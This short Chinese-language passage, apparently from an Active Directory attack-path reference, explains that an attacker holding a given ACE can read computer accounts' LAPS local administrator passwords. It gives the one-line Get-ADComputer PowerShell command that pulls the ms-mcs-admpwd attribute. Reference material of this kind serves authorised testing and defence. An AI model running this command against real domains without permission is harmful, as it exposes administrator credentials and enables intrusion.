	攻击者可以读取此 ACE 应用到的计算机帐户的 LAPS 密码。这可以通过 Active Directory PowerShell 模块来实现。
	>Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'